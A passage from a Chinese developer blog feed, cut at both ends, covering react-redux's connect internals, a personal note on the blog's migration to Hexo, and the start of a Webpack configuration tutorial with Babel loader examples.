class="title">wrapWithConnect</span>(<span class="params">WrappedComponent</span>) </span>&#123;</div><div class="line">     ...</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>connect先处理第一个参数<code>mapStateToProps</code>，是否定义该参数，未定义将用<code>defaultMapStateToProps</code>，这将使storeState对组件失去意义，因为默认返回空对象。<code>shouldSubscribe</code>将在之后被用到，可以先放在一边(源码注释2-1)<br>。</p>
<p>接下来处理<code>mapDispatchToProps</code>，它会有三种情况(源码注释2-2)。</p>
<ul>
<li>当参数为一个函数时，<code>mapDispatch</code>即为参数函数，会被传入两个参数，store.dispatch与props。</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> * <span class="keyword">as</span> actionCreators <span class="keyword">from</span> <span class="string">'./actionCreators'</span>;</div><div class="line"><span class="keyword">import</span> &#123; bindActionCreators &#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapStateToProps</span>(<span class="params">state</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> &#123; todos: state.todos &#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapDispatchToProps</span>(<span class="params">dispatch</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> &#123; actions: bindActionCreators(actionCreators, dispatch) &#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(mapStateToProps, mapDispatchToProps)(TodoApp);</div></pre></td></tr></table></figure>
<ul>
<li>当参数未定义时，会返回store.dispatch，向组件的props传入，此时往往action都是通过外部引入的，注意：直接调用action是无法改变storeState，引发reduce的，需要用store.dispatch绑定或执行action。</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> * <span class="keyword">as</span> actionCreators <span class="keyword">from</span> <span class="string">'./actionCreators'</span>;</div><div class="line"><span class="keyword">import</span> &#123; bindActionCreators &#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapStateToProps</span>(<span class="params">state</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> &#123; todos: state.todos &#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoApp</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">  handleAddTodo() &#123;</div><div class="line">    <span class="keyword">const</span> &#123; dispatch &#125; = <span class="keyword">this</span>.props;</div><div class="line">    <span class="keyword">const</span> &#123; addTodo &#125; = actionCreators;</div><div class="line">    dispatch(addTodo());</div><div class="line">  &#125;</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(mapStateToProps, mapDispatchToProps)(TodoApp);</div></pre></td></tr></table></figure>
<ul>
<li>当参数为函数对象时，默认使用<code>bindActionCreators</code>将对象中的函数与dispatch进行绑定。</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> * <span class="keyword">as</span> actionCreators <span class="keyword">from</span> <span class="string">'./actionCreators'</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapStateToProps</span>(<span class="params">state</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> &#123; todos: state.todos &#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoApp</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">  handleAddTodo() &#123;</div><div class="line">    <span class="keyword">this</span>.props.addTodo();</div><div class="line">  &#125;</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(mapStateToProps, actionCreators)(TodoApp);</div></pre></td></tr></table></figure>
<p>第三个参数<code>mergeProps</code>的默认值将<code>mapStateToProps</code>, <code>mapDispatchToProps</code>与<code>ownProps</code>三者合并，交给connect的组件(源码注释2-3)。</p>
<p>第四个参数<code>option</code>包含两个值，<code>pure</code>与<code>withRef</code>，<code>pure</code>为true的情况下，在<code>connect</code>内部会帮助我们做一些<code>props</code>的浅比较，避免不必要的更新，比如: 比较<code>finalMergeProps</code>与<code>defaultMergeProps</code>的结果。<code>withRef</code>会在之后的源码分析中会再详细讲解。</p>
<h3 id="wrapWithConnect"><a href="#wrapWithConnect" class="headerlink" title="wrapWithConnect"></a>wrapWithConnect</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connect</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">  ...</div><div class="line">  constructor(props, context) &#123;</div><div class="line">    <span class="keyword">super</span>(props, context)</div><div class="line"></div><div class="line">    <span class="comment">// 获取Provider传入的store，顶层props，非顶层context</span></div><div class="line">    <span class="keyword">this</span>.store = props.store || context.store</div><div class="line"></div><div class="line">    <span class="comment">// this.state与this.store</span></div><div class="line">    <span class="keyword">const</span> storeState = <span class="keyword">this</span>.store.getState()</div><div class="line">    <span class="keyword">this</span>.state = &#123; storeState &#125;</div><div class="line">  &#125;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在wrapWithConnect中，首先会从props或context中获取到store存入this.store，将stroe中的state存入this.state，这对之后判断是非更新都会起到非常重要的作用。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">componentDidMount() &#123;</div><div class="line">  <span class="keyword">this</span>.trySubscribe()</div><div class="line">&#125;</div><div class="line"></div><div class="line">trySubscribe() &#123;</div><div class="line">  <span class="keyword">if</span> (shouldSubscribe &amp;&amp; !<span class="keyword">this</span>.unsubscribe) &#123;</div><div class="line">    <span class="keyword">this</span>.unsubscribe = <span class="keyword">this</span>.store.subscribe(<span class="keyword">this</span>.handleChange.bind(<span class="keyword">this</span>))</div><div class="line">    <span class="keyword">this</span>.handleChange()</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过<code>trySubscribe</code>，我们会利用<code>this.store.subscribe</code>对每一次action操作做监听，执行handleChange操作。当<code>shouldSubscribe</code>(源码2-1)为false，即mapStateToProps未传入时，就会失去对storeState变化的感知。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">handleChange() &#123;</div><div class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.unsubscribe) &#123;</div><div class="line">    <span class="keyword">return</span></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">const</span> storeState = <span class="keyword">this</span>.store.getState()</div><div class="line">  <span class="keyword">const</span> prevStoreState = <span class="keyword">this</span>.state.storeState</div><div class="line">  <span class="keyword">if</span> (pure &amp;&amp; prevStoreState === storeState) &#123;</div><div class="line">    <span class="keyword">return</span></div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="keyword">if</span> (pure &amp;&amp; !<span class="keyword">this</span>.doStatePropsDependOnOwnProps) &#123;</div><div class="line">    <span class="keyword">const</span> haveStatePropsChanged = tryCatch(<span class="keyword">this</span>.updateStatePropsIfNeeded, <span class="keyword">this</span>)</div><div class="line">    <span class="keyword">if</span> (!haveStatePropsChanged) &#123;</div><div class="line">      <span class="keyword">return</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (haveStatePropsChanged === errorObject) &#123;</div><div class="line">      <span class="keyword">this</span>.statePropsPrecalculationError = errorObject.value</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.haveStatePropsBeenPrecalculated = <span class="literal">true</span></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">this</span>.hasStoreStateChanged = <span class="literal">true</span></div><div class="line"></div><div class="line">  <span class="comment">// 同步storeState</span></div><div class="line">  <span class="keyword">this</span>.setState(&#123; storeState &#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们主要关注于每一次action后storeState的变化，这里就会使用到之前存在this.state中的storeState，它存储了上一个storeState的值。</p>
<p>mapStateToProps可以接受state(storeState)、 props(ownProps)两个参数，它的返回值stateProps会受到storeState与ownProps双重影响。在这里我们只能知道在mapStateToProps的参数中是否定义了ownProps，却无法得知ownProps是否发生了变化。ownProps发生变化的处理会在其他地方完成，这里专注于storeState对stateProps的影响，可能会让人有种残缺感。</p>
<p>如果没有变化(return)，维持<code>this.hasStoreStateChanged</code>默认值false。stateProps将由是否在mapStateToProps定义props参数(<code>this.doStatePropsDependOnOwnProps</code>)与props是否变化所决定。</p>
<p>如果发生变化，且mapStateToProps未定义props参数，也就是stateProps完全受storeState控制。我们就可以直接得出stateProps是否改变，以及stateProps改变后的结果了。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">computeStateProps(store, props) &#123;</div><div class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.finalMapStateToProps) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.configureFinalMapState(store, props)</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">const</span> state = store.getState()</div><div class="line">  </div><div class="line">  <span class="keyword">const</span> stateProps = <span class="keyword">this</span>.doStatePropsDependOnOwnProps ?</div><div class="line">    <span class="keyword">this</span>.finalMapStateToProps(state, props) :</div><div class="line">    <span class="keyword">this</span>.finalMapStateToProps(state)</div><div class="line"></div><div class="line">  <span class="keyword">return</span> stateProps</div><div class="line">&#125;</div><div class="line"></div><div class="line">configureFinalMapState(store, props) &#123;</div><div class="line">  <span class="keyword">const</span> mappedState = mapState(store.getState(), props)</div><div class="line">  <span class="keyword">const</span> isFactory = <span class="keyword">typeof</span> mappedState === <span class="string">'function'</span></div><div class="line"></div><div class="line">  <span class="keyword">this</span>.finalMapStateToProps = isFactory ? mappedState : mapState</div><div class="line">  </div><div class="line">  <span class="comment">// function.length等于function传入参数的个数</span></div><div class="line">  <span class="keyword">this</span>.doStatePropsDependOnOwnProps = <span class="keyword">this</span>.finalMapStateToProps.length !== <span class="number">1</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> (isFactory) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.computeStateProps(store, props)</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="keyword">return</span> mappedState</div><div class="line">&#125;</div><div class="line"></div><div class="line">updateStatePropsIfNeeded() &#123;</div><div class="line">  <span class="keyword">const</span> nextStateProps = <span class="keyword">this</span>.computeStateProps(<span class="keyword">this</span>.store, <span class="keyword">this</span>.props)</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.stateProps &amp;&amp; shallowEqual(nextStateProps, <span class="keyword">this</span>.stateProps)) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">this</span>.stateProps = nextStateProps</div><div class="line">  <span class="keyword">return</span> <span class="literal">true</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们现在需要得出mapStateToProps的返回值stateProps，向<code>computeStateProps</code>传入<code>this.store</code>与<code>this.props</code>，<code>finalMapStateToProps</code>是传入storeState和props的函数，mapStateToProps所返回的可能是对象，也可能是函数，利用函数来进行一些优化。在react-redux中采用了非常多函数式编程的思想，参数值保持一致，在没有外部依赖的情况下，所得到的结果必然一致。</p>
<p>对于<code>stateProps</code>，<code>dispatchProps</code>与<code>ownProps</code>三者而言，都有统一的更新入口，分别为<code>updateStatePropsIfNeeded</code>，<code>updateDispatchPropsIfNeeded</code>与<code>updateMergedPropsIfNeeded</code>。它们实现思想是一致的，将上次的结果存放在this当中，与本次的结果进行比较，以此来避免不必要的更新。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">componentWillReceiveProps(nextProps) &#123;</div><div class="line">  <span class="keyword">if</span> (!pure || !shallowEqual(nextProps, <span class="keyword">this</span>.props)) &#123;</div><div class="line">    <span class="keyword">this</span>.haveOwnPropsChanged = <span class="literal">true</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">shouldComponentUpdate() &#123;</div><div class="line">  <span class="keyword">return</span> !pure || <span class="keyword">this</span>.haveOwnPropsChanged || <span class="keyword">this</span>.hasStoreStateChanged</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当pure不为true, 父组件传入props发生变化(<code>componentWillReceiveProps</code>判断)以及storeState发生变化(<code>this.store.subscribe(this.handleChange.bind(this))</code>，handleChange判断)，都在<code>shouldComponentUpdate</code>前执行。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">getWrappedInstance() &#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.refs.wrappedInstance</div><div class="line">&#125;</div><div class="line"></div><div class="line">render() &#123;</div><div class="line">  ...</div><div class="line">  let haveMergedPropsChanged = <span class="literal">true</span></div><div class="line">  <span class="keyword">if</span> (</div><div class="line">    haveStatePropsChanged ||</div><div class="line">    haveDispatchPropsChanged ||</div><div class="line">    haveOwnPropsChanged</div><div class="line">  ) &#123;</div><div class="line">    haveMergedPropsChanged = <span class="keyword">this</span>.updateMergedPropsIfNeeded()</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    haveMergedPropsChanged = <span class="literal">false</span></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (!haveMergedPropsChanged &amp;&amp; renderedElement) &#123;</div><div class="line">    <span class="keyword">return</span> renderedElement</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (withRef) &#123;</div><div class="line">    <span class="keyword">this</span>.renderedElement = createElement(WrappedComponent, &#123;</div><div class="line">      ...this.mergedProps,</div><div class="line">      ref: <span class="string">'wrappedInstance'</span></div><div class="line">    &#125;)</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">this</span>.renderedElement = createElement(WrappedComponent,</div><div class="line">      <span class="keyword">this</span>.mergedProps</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.renderedElement</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在render中主要还是判断是否需要更新，然后将一些标记初始化，待下一次更新时使用。在<code>updateMergedPropsIfNeeded</code>中将<code>stateProps</code>, <code>dispatchProps</code>与<code>ownProps</code>合并在一起，作为<code>WrappedComponent</code>的props传入，这样我们就可以在子组件的props中拿到想要的东西了。</p>
<p><code>withRef</code>会向子组件传递<code>ref</code>值，通过函数<code>getWrappedInstance</code>可进行引用。</p>
<h2 id="ES7-Decorator"><a href="#ES7-Decorator" class="headerlink" title="ES7 Decorator"></a>ES7 Decorator</h2><p>connect的常规写法：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(mapStateToProps, actions)(App)</div></pre></td></tr></table></figure>
<p>使用Decorator会使代码更加清晰，connect主要作用就是store与component的连接，作为一个中间层，处理上层给予的storeState，父组件props与actions，整合后作为props给予下层组件。</p>
<p>Decorator对类行为的改变，在代码编译时发生，本质上就是在编译时执行的函数。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">@connect((state, props) =&gt; &#123;</div><div class="line">  <span class="keyword">return</span> &#123;</div><div class="line">    ...</div><div class="line">  &#125;</div><div class="line">&#125;, &#123;</div><div class="line">  ...actions</div><div class="line">&#125;)</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>写了一个<strong><a href="https://github.com/BlackGanglion/babel-decorator-example" target="_blank" rel="external">简单模拟coonect的示例</a></strong>，Decorator将类作为参数传入，处理完成之后再返回，相当于外层的一次包裹。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://redux.js.org/index.html" target="_blank" rel="external">react docs</a><br><a href="https://github.com/reactjs/react-redux/blob/master/docs/api.md#api" target="_blank" rel="external">react-redux docs</a><br><a href="http://es6.ruanyifeng.com/#docs/decorator" target="_blank" rel="external">ECMAScript6入门-修饰器</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/images/22-1.jpg&quot; alt=&quot;ReduxAndReact&quot; width=&quot;65%&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;From the very beginning, we need to stress that Redux has no relation to React. You can write Redux apps with React, Angular, Ember, jQuery, or vanilla JavaScript.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们经常将redux与react两者放在一起谈论，但实际上Redux与React并没有直接关联，也没有相互依赖的。Redux本质上是一个状态容器，给予开发者维护状态的能力，而这恰恰是React的薄弱环节。&lt;/p&gt;
&lt;p&gt;在仅有React的开发中，我们不得不将组件的状态存入state中，子组件需要通过父组件给予的回调函数修改父组件的state，父组件需要把状态通过props传递给子组件。两个组件间需要通信(也可以理解为两个组件需要相互修改状态)，就需要将state存储在他们共有的父组件中。随着应用越来越复杂，父组件的state越来越大，传给子组件的props也越来越复杂(即包含数据, 又有回调函数)。&lt;/p&gt;
&lt;p&gt;此时Redux出现了，Redux单一数据流的思想和react是不谋而合的。我们可以将整个父组件的state放入Redux的store中进行维护。但我们在本文开头提到过，Redux与React之间是没有关联的，那么如何将Redux与React串联起来呢? 我们使用了&lt;a href=&quot;https://github.com/reactjs/react-redux&quot;&gt;react-redux&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="React全家桶" scheme="http://blackganglion.com/categories/React%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    
    
      <category term="Redux" scheme="http://blackganglion.com/tags/Redux/"/>
    
  </entry>
  
  <entry>
    <title>Reducer, 新的旅程</title>
    <link href="http://blackganglion.com/2016/07/09/%E6%96%B0%E7%9A%84%E6%97%85%E7%A8%8B/"/>
    <id>http://blackganglion.com/2016/07/09/新的旅程/</id>
    <published>2016-07-08T19:18:49.000Z</published>
    <updated>2016-07-08T20:20:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>现在是北京时间2016年7月9日凌晨3点18分。不得不感叹时间过得非常快，这个博客创建居然快一年了，而没有更博客也有两个月多了。终于下定决心把博客换成了Hexo+Next的清新款，经过一晚上的努力，顺利地完成了搭建与迁移。</p>
<p>博客，我赋予了新的名字 - “Reducer”，可能是最近Redux开发多了的缘故吧，有点中毒，哈哈，开个玩笑~~ </p>
<p>“Reducer” 蕴含有归约、归纳的含义，它也彰显了我换博客的原因所在。接下来，我希望能更加专注于博客内容本身，将更多的时间用于技术的思考与归纳总结。老博客虽然完全由我打造，极具个性化，但还有非常多的地方需要去改进与优化。现阶段，我的业余精力是比较有限，应该更加专注与高效，而Hexo+Next主题简约的风格和快速部署与写作的能力吸引了我，毫不犹豫的选择。</p>
<p>给老博客留张截图吧，更换并不意味着完全废弃，我依然会抽空继续开发和完善，期待重出江湖!</p>
<p><img src="/images/21-1.png" alt="老博客图片"></p>
<a id="more"></a>
<p>这两个多月经历了挺多的，收获满满。首先是喜悦吧，3月初到4月底在自习教室准备将近两个月的实习面试，最后收到阿里、腾讯、网易的Offer，蘑菇街也到最后一面了，由于和阿里入职时间冲突而放弃。相比于第一次电话面试后的”万念俱灰”与等待面试结果的忐忑与煎熬，今天再回头看，身边的同学仍在为考研和实习发着愁，内心有那样一丝欣慰，自己能较早地明确了方向，所做的努力也没有白费，运气也不差。</p>
<p>进阿里是我一直以来的梦想，曾经觉得它是那么遥不可攀。咱马总说过，梦想总是要有的，万一实现了呢? 我可能就那么万一了。实习已经整整两个月了，我的幸福感挺高的，这可能来源于各个方面，技术的提高与成长，so nice的同事与团队氛围，项目中的紧密协作等等。当然，我还只是只小菜鸟，无论是代码的质量，技术的深刻理解，开发工具的熟练程度，对于业务需求的理解，还是对于问题的思考与把握上，都能看到与师兄们鲜明的差距。接下来，我需要加倍努力才行。</p>
<p>夜很深了，困了，明天又会是崭新的一天，新的旅程已经起航，我在路上，加油，淡苍!</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现在是北京时间2016年7月9日凌晨3点18分。不得不感叹时间过得非常快，这个博客创建居然快一年了，而没有更博客也有两个月多了。终于下定决心把博客换成了Hexo+Next的清新款，经过一晚上的努力，顺利地完成了搭建与迁移。&lt;/p&gt;
&lt;p&gt;博客，我赋予了新的名字 - “Reducer”，可能是最近Redux开发多了的缘故吧，有点中毒，哈哈，开个玩笑~~ &lt;/p&gt;
&lt;p&gt;“Reducer” 蕴含有归约、归纳的含义，它也彰显了我换博客的原因所在。接下来，我希望能更加专注于博客内容本身，将更多的时间用于技术的思考与归纳总结。老博客虽然完全由我打造，极具个性化，但还有非常多的地方需要去改进与优化。现阶段，我的业余精力是比较有限，应该更加专注与高效，而Hexo+Next主题简约的风格和快速部署与写作的能力吸引了我，毫不犹豫的选择。&lt;/p&gt;
&lt;p&gt;给老博客留张截图吧，更换并不意味着完全废弃，我依然会抽空继续开发和完善，期待重出江湖!&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/21-1.png&quot; alt=&quot;老博客图片&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="生活札记" scheme="http://blackganglion.com/categories/%E7%94%9F%E6%B4%BB%E6%9C%AD%E8%AE%B0/"/>
    
    
      <category term="生活札记" scheme="http://blackganglion.com/tags/%E7%94%9F%E6%B4%BB%E6%9C%AD%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>浅尝 Webpack</title>
    <link href="http://blackganglion.com/2016/04/27/%E6%B5%85%E5%B0%9DWebpack/"/>
    <id>http://blackganglion.com/2016/04/27/浅尝Webpack/</id>
    <published>2016-04-27T07:34:00.000Z</published>
    <updated>2016-07-07T02:21:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要根据阮一峰老师的<a href="https://github.com/ruanyf/webpack-demos" target="_blank" rel="external">webpack-demos</a>进行一些提炼。Webpack作为目前作为火热的前端构建工具，redux的官方示例中也使用到了<code>webpack-dev-middleware</code>、<code>webpack-hot-middleware</code>等，便想再次总结学习一下。</p>
<h2 id="入口与出口文件"><a href="#入口与出口文件" class="headerlink" title="入口与出口文件"></a>入口与出口文件</h2><p>entry为入口文件，output为出口文件，通过webpack的处理，当前目录下的main.js会转变为bundle.js。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// webpack.config.js</span></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./main.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>当然多入口与多出口文件也是被允许的，例如下面的例子，main1.js转变为bundle1.js，main2.js转变为bundle2.js。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: &#123;</div><div class="line">    bundle1: <span class="string">'./main1.js'</span>,</div><div class="line">    bundle2: <span class="string">'./main2.js'</span></div><div class="line">  &#125;,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'[name].js'</span></div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>path</code>是打包文件存放的绝对路径，<code>publicPath</code>是网站运行时的访问路径，也可以说是生产环境吧。</p>
<h2 id="Babel加载"><a href="#Babel加载" class="headerlink" title="Babel加载"></a>Babel加载</h2><p>Babel目前也非常常见，ES6/7的新特性使用，React的JSX的编译，都需要Babel的帮助。而在webpack的配置中可以集成Babel。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./main.jsx'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">  <span class="built_in">module</span>: &#123;</div><div class="line">    loaders: [</div><div class="line">      &#123;</div><div class="line">        test: <span class="regexp">/\.jsx?$/</span>,</div><div class="line">        exclude: <span class="regexp">/node_modules/</span>,</div><div class="line">        loader: <span class="string">'babel'</span>,</div><div class="line">        query: &#123;</div><div class="line">          presets: [<span class="string">'es2015'</span>, <span class="string">'react'</span>]</div><div class="line">          <span class="comment">// npm install --save-dev babel-preset-stage-0</span></div><div class="line">          <span class="comment">// presets: ['es2015', 'react', 'stage-0']</span></div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    ]</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
